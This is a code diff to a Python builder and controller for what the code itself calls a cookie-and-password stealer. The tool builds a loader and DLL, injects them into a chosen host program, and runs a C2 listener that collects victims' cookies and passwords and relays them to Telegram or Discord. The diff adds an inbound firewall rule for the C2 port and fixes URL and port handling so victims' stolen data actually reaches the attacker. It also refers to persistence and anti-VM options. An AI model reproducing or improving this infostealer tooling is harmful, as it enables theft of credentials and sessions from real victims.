@@ -50,6 +50,7 @@ What it does:
 Press Ctrl+C to stop early.
 """
 import json, os, re, shutil, socket, subprocess, sys, time, struct, urllib.request, urllib.parse
+from c2auth import parse_c2_url, port_from_url
 
 HERE   = os.path.dirname(os.path.abspath(__file__))
 BIN    = os.path.join(HERE, "bin")
@@ -222,6 +223,51 @@ def find_best_port(start=9400, end=9500, preferred=None):
             continue
     return None
 
+def _find_vcvars():
+    """Locate vcvars64.bat: vswhere first, then the two common install roots."""
+    candidates = []
+    vswhere = os.path.join(os.environ.get("ProgramFiles(x86)", r"C:\Program Files (x86)"),
+                           "Microsoft Visual Studio", "Installer", "vswhere.exe")
+    if os.path.isfile(vswhere):
+        try:
+            r = subprocess.run([vswhere, "-latest", "-products", "*",
+                                "-requires", "Microsoft.VisualStudio.Component.VC.Tools.x86.x64",
+                                "-property", "installationPath"],
+                               capture_output=True, text=True, timeout=15)
+            root = (r.stdout or "").strip().splitlines()
+            if root:
+                candidates.append(os.path.join(root[0], r"VC\Auxiliary\Build\vcvars64.bat"))
+        except Exception:
+            pass
+    for root in (os.environ.get("VSINSTALLDIR", ""),
+                 r"C:\Program Files\Microsoft Visual Studio\2022\Community",
+                 r"C:\Program Files\Microsoft Visual Studio\2022\Professional",
+                 r"C:\Program Files\Microsoft Visual Studio\2022\Enterprise",
+                 r"C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools"):
+        if root:
+            candidates.append(os.path.join(root, r"VC\Auxiliary\Build\vcvars64.bat"))
+    for c in candidates:
+        if c and os.path.isfile(c):
+            return c
+    return None
+
+def _compiler_ready():
+    """cl.exe + ml64.exe only exist after vcvars; check the install itself."""
+    vc = _find_vcvars()
+    if not vc:
+        return False, "vcvars64.bat not found (Visual Studio C++ build tools missing)"
+    root = os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(vc))))
+    msvc = os.path.join(root, "Tools", "MSVC")
+    if not os.path.isdir(msvc):
+        return False, "MSVC toolset directory missing under %s" % root
+    for ver in os.listdir(msvc):
+        cl = os.path.join(msvc, ver, "bin", "Hostx64", "x64", "cl.exe")
+        ml = os.path.join(msvc, ver, "bin", "Hostx64", "x64", "ml64.exe")
+        if os.path.isfile(cl) and os.path.isfile(ml):
+            return True, ver
+    return False, ("MSVC is installed but cl.exe/ml64.exe are missing -- repair "
+                   "'Desktop development with C++' in the Visual Studio Installer")
+
 def ensure_build():
     """Build loader.exe + ckdll.dll if they don't exist."""
     if os.path.isfile(LOADER) and os.path.isfile(DLL):
@@ -236,9 +282,19 @@ def ensure_build():
     if not os.path.isfile(BUILD):
         log("[-] build.bat not found")
         return False
-    log("[*] building binaries (needs MSVC)...")
-    r = subprocess.run(["cmd", "/c", BUILD], cwd=HERE,
-                       capture_output=True, text=True, timeout=60)
+    ok, info = _compiler_ready()
+    if not ok:
+        log("[-] no usable C++ toolchain: %s" % info)
+        log("    install Visual Studio Build Tools -> 'Desktop development with C++'")
+        log("    (or copy prebuilt bin/loader.exe + bin/ckdll.dll from another machine)")
+        return False
+    log("[*] building binaries with MSVC %s (needs a minute)..." % info)
+    try:
+        r = subprocess.run(["cmd", "/c", BUILD], cwd=HERE,
+                           capture_output=True, text=True, timeout=300)
+    except subprocess.TimeoutExpired:
+        log("[-] build timed out after 300s")
+        return False
     if r.stdout:
         for line in r.stdout.strip().splitlines():
             log("    " + line)
@@ -425,11 +481,39 @@ def find_port_owner_pid(port):
         pass
     return None, None
 
+def _open_firewall_port(port):
+    """Best-effort inbound allow rule. Without it Windows silently drops the
+    victim's SYN and the payload falls back to a local cache.json."""
+    if sys.platform != "win32":
+        return True
+    rule = "cookielog C2 %d" % port
+    try:
+        subprocess.run(["netsh", "advfirewall", "firewall", "delete", "rule",
+                        "name=%s" % rule], capture_output=True, timeout=15,
+                       creationflags=0x08000000)
+        r = subprocess.run(["netsh", "advfirewall", "firewall", "add", "rule",
+                            "name=%s" % rule, "dir=in", "action=allow",
+                            "protocol=TCP", "localport=%d" % port, "profile=any"],
+                           capture_output=True, text=True, timeout=15,
+                           creationflags=0x08000000)
+        return r.returncode == 0
+    except Exception:
+        return False
+
+def _listener_health(port, timeout=4):
+    """GET /health on the listener we just spawned."""
+    try:
+        req = urllib.request.Request("http://127.0.0.1:%d/health" % port)
+        with urllib.request.urlopen(req, timeout=timeout) as resp:
+            return resp.status == 200
+    except Exception:
+        return False
+
 def start_listener(port, telegram=None, discord=None):
     """Start listen.py in background. Returns the process handle.
     If telegram or discord are provided, listen.py relays received cookies to them.
     Uses CREATE_NEW_CONSOLE so the listener has its own window (can't be killed by
-    closing the main terminal). Output is also written to loot/listener.log."""
+    closing the main terminal); the window is its log."""
     os.makedirs(LOOT, exist_ok=True)
     # refuse to start twice: a zombie listener from a previous run kept the port,
     # the new listener died with EADDRINUSE and every victim POST was lost
@@ -456,6 +540,15 @@ def start_listener(port, telegram=None, discord=None):
                 log("[!] port %d is held by another process (PID=%d: %s)" % (port, pid, (cl or "?")[:90]))
             log("[!] kill it or pass --port / --find-port")
             return None
+    # Windows Firewall: inbound is blocked by default for python.exe.
+    # A missing rule = the payload cannot POST = local fallback only.
+    if sys.platform == "win32":
+        if _open_firewall_port(port):
+            log("[+] firewall: inbound TCP %d allowed" % port)
+        else:
+            log("[!] could not add the inbound firewall rule (needs an Administrator shell).")
+            log("[!]   run once as admin: netsh advfirewall firewall add rule "
+                "name=\"cookielog C2 %d\" dir=in action=allow protocol=TCP localport=%d" % (port, port))
     # clean old loot (both old and new filenames)
     for f in ["all_cookies.json", "all_cookies.txt",
               "passwords.json", "passwords.txt",
@@ -464,7 +557,10 @@ def start_listener(port, telegram=None, discord=None):
               "listener.log"]:
         p = os.path.join(LOOT, f)
         if os.path.exists(p):
-            os.remove(p)
+            try:
+                os.remove(p)
+            except OSError:
+                pass
     cmd = [sys.executable, "-u", LISTEN, str(port)]
     if telegram:
         cmd += ["--telegram", telegram]
@@ -480,11 +576,25 @@ def start_listener(port, telegram=None, discord=None):
     else:
         kwargs["start_new_session"] = True
     proc = subprocess.Popen(cmd, cwd=HERE, **kwargs)
-    time.sleep(2)
+    # wait for the socket to accept, not just for the process to exist
+    for _ in range(20):
+        if proc.poll() is not None:
+            log("[-] listener failed to start (exit %d)" % proc.returncode)
+            return None
+        if _listener_health(port, timeout=0.5):
+            break
+        time.sleep(0.25)
     if proc.poll() is not None:
         log("[-] listener failed to start")
         return None
-    log("[+] listener on port %d (PID=%d)" % (port, proc.pid))
+    if not _listener_health(port):
+        log("[!] listener process is up but /health does not answer on 127.0.0.1:%d" % port)
+        log("[!]   check loot/listener.log; another firewall may be dropping loopback")
+    else:
+        log("[+] listener on port %d (PID=%d), ingest verified" % (port, proc.pid))
+    lan = detect_ip()
+    if not lan.startswith("127."):
+        log("[*] listener bound on 0.0.0.0 — LAN address: http://%s:%d/" % (lan, port))
     return proc
 
 def check_c2_reachable(c2_url, timeout=4):
@@ -918,7 +1028,7 @@ def pick_gui():
             if dc_key:
                 cfg_new["discord"] = dc_key
             cfg_new["persist"] = bool(persist_var.get())
-            cfg_new["port"] = cfg.get("port", 9090)
+            cfg_new["port"] = int(port_var.get())
             save_config(cfg_new)
             return cfg_new
 
@@ -932,9 +1042,19 @@ def pick_gui():
             if dc:
                 result["discord"] = dc
             result["persist"] = ps
-            # Collect C2 URL and anti-VM from GUI
+            # Collect C2 URL and anti-VM from GUI. The Port field is
+            # authoritative for this run: rewrite the URL's port so the
+            # listener and the embedded URL always agree.
             c2 = c2_var.get().strip()
             if c2:
+                try:
+                    p = int(port_var.get())
+                    body = c2.split("://", 1)[-1]
+                    auth, _, rest = body.partition("/")
+                    host = auth.rsplit(":", 1)[0] if ":" in auth else auth
+                    c2 = "http://%s:%d/%s" % (host, p, rest)
+                except (ValueError, IndexError):
+                    pass
                 result["c2_url"] = c2
             result["no_anti_vm"] = bool(avm_var.get())
             # Save port to config
@@ -1277,9 +1397,11 @@ def interactive_loop():
                 resp = ur.urlopen(req, timeout=5)
                 log("[+] listener test: HTTP %d %s" % (resp.status, resp.read().decode()))
                 # Check if loot was written
-                jp = os.path.join(LOOT, "cookies.json")
+                jp = os.path.join(LOOT, "all_cookies.json")
+                if not os.path.exists(jp):
+                    jp = os.path.join(LOOT, "cookies_all.json")
                 if os.path.exists(jp) and os.path.getsize(jp) > 10:
-                    log("[+] loot/cookies.json written (%d bytes)" % os.path.getsize(jp))
+                    log("[+] loot/all_cookies.json written (%d bytes)" % os.path.getsize(jp))
                     sp = os.path.join(LOOT, "session_cookies.json")
                     if os.path.exists(sp):
                         log("[+] loot/session_cookies.json written (%d bytes)" % os.path.getsize(sp))
@@ -1309,7 +1431,7 @@ def interactive_loop():
 
         elif cmd == "gui":
             # Launch GUI picker, then run the full flow
-            host_path, mode, gui_run, gui_tg, gui_dc, gui_persist = pick_gui()
+            host_path, mode, gui_run, gui_tg, gui_dc, gui_persist, gui_c2, gui_avm = pick_gui()
             if not host_path:
                 log("[-] nothing selected")
                 continue
@@ -1317,7 +1439,19 @@ def interactive_loop():
             telegram = gui_tg
             discord = gui_dc
             persist = gui_persist
-            run_one(host_path, mode, gui_run, port, telegram, discord, persist)
+            gui_port = port
+            if gui_c2:
+                try:
+                    info = parse_c2_url(gui_c2, fallback_port=port)
+                    gui_port = info["port"]
+                except ValueError as ex:
+                    log("[-] invalid C2 URL from the GUI: %s" % ex)
+                    continue
+                if info["loopback"] and not gui_run:
+                    log("[-] refusing a loopback C2 for a remote victim: %s" % info["url"])
+                    continue
+            run_one(host_path, mode, gui_run, gui_port, telegram, discord,
+                    persist, gui_avm, gui_c2)
 
         elif cmd == "infect":
             if not rest:
@@ -1378,8 +1512,17 @@ def run_one(host_path, mode, run_local, port, telegram, discord, persist, no_ant
     # 2. detect IP
     log("\n[2/5] detecting attacker IP...")
     if c2_override:
-        c2_url = c2_override
-        ip = c2_override
+        try:
+            info = parse_c2_url(c2_override, fallback_port=port)
+        except ValueError as ex:
+            log("[-] invalid C2 URL: %s" % ex)
+            return
+        port = info["port"]
+        c2_url = info["url"]
+        ip = info["host"]
+        if info["loopback"] and not run_local:
+            log("[-] refusing a loopback C2 for a remote victim: %s" % c2_url)
+            return
         log("[+] C2 URL (manual): %s" % c2_url)
     else:
         ip = detect_ip()
@@ -1497,6 +1640,7 @@ def main():
         # default: GUI mode (fall through)
 
     port = 9090
+    port_explicit = False
     host_arg = None
     run_local = False
     telegram = None
@@ -1515,7 +1659,7 @@ def main():
     while i < len(args):
         a = args[i]
         if a == "--port" and i + 1 < len(args):
-            port = int(args[i + 1]); i += 2
+            port = int(args[i + 1]); port_explicit = True; i += 2
         elif a == "--run":
             run_local = True; i += 1
         elif a == "--cli":
@@ -1575,11 +1719,31 @@ def main():
     if not persist and cfg.get("persist"):
         persist = True
         log("[*] Persist: loaded from config.json")
-    if port == 9090 and cfg.get("port"):
+    if not port_explicit and cfg.get("port"):
         port = cfg["port"]
 
-    # --find-port: scan for a free port and use it
-    if find_port:
+    # A C2 URL and the listener port must be the same number. The old flow
+    # listened on --port while the payload dialled the port typed in the URL:
+    # different numbers, zero deliveries.
+    if c2_override:
+        try:
+            info = parse_c2_url(c2_override, fallback_port=port)
+        except ValueError as ex:
+            log("[-] invalid --c2 URL: %s" % ex)
+            return 1
+        if port_explicit and info["port"] != port:
+            log("[!] --port %d overridden: the --c2 URL dials %d" % (port, info["port"]))
+        port = info["port"]
+        c2_override = info["url"]
+        if info["loopback"] and not run_local:
+            log("[-] refusing to build with a loopback C2: %s" % info["url"])
+            log("    The victim would POST to its own 127.0.0.1 and you would receive nothing.")
+            log("    Give the attacker LAN/public address, or add --run for a same-machine test.")
+            return 1
+
+    # --find-port: scan for a free port and use it. Never override a --c2 URL:
+    # the URL is the address the payload will dial, so its port wins.
+    if find_port and not c2_override:
         log("[*] scanning for a free port (9400-9500)...")
         best = find_best_port(start=9400, end=9500, preferred=port)
         if best is not None:
@@ -1590,6 +1754,10 @@ def main():
             port = best
         else:
             log("[-] no free port found in range 9400-9500, using %d" % port)
+
+    # the URL is the source of truth for the port the payload dials
+    if c2_override:
+        port = port_from_url(c2_override, port)
 
     # Save new values to config if provided via CLI
     cfg_new = load_config()
@@ -1628,6 +1796,11 @@ def main():
         log("[+] C2 URL (manual): %s" % c2_url)
     else:
         ip = detect_ip()
+        if ip.startswith("127.") and not run_local:
+            log("[-] could not detect a usable attacker IP (got 127.0.0.1).")
+            log("    A loopback C2 can never receive from a different machine.")
+            log("    Use --c2 http://YOUR_LAN_OR_PUBLIC_IP:%d/ and retry." % port)
+            return 1
         c2_url = "http://%s:%d/" % (ip, port)
         log("[+] C2 URL: %s" % c2_url)
     if telegram:
@@ -1674,9 +1847,26 @@ def main():
             run_local = True
             c2_url = "http://127.0.0.1:%d/" % port
         elif gui_c2:
-            # Use the C2 URL from the GUI (may be public IP)
-            c2_url = gui_c2
-            c2_override = gui_c2  # prevent detect_ip from overwriting
+            # Use the C2 URL from the GUI (may be public IP). The URL owns the
+            # port: bind the listener where the payload will dial, not on the
+            # (possibly different) number in the Port field.
+            try:
+                info = parse_c2_url(gui_c2, fallback_port=port)
+            except ValueError as ex:
+                log("[-] invalid C2 URL from the GUI: %s" % ex)
+                return 1
+            if info["port"] != port:
+                log("[!] C2 URL port %d overrides the Port field (%d)" % (info["port"], port))
+            if info["loopback"] and not run_local:
+                log("[-] refusing a loopback C2 for a remote victim: %s" % info["url"])
+                log("    The victim would post to its own 127.0.0.1. Use this machine's")
+                log("    LAN address, or tick 'RUN LOCALLY' for a same-machine test.")
+                return 1
+            port = info["port"]
+            c2_url = info["url"]
+            c2_override = info["url"]  # prevent detect_ip from overwriting
+            cfg["port"] = port
+            save_config(cfg)
         if gui_avm:
             no_anti_vm = True
         # GUI values are authoritative — if the user unchecked a relay
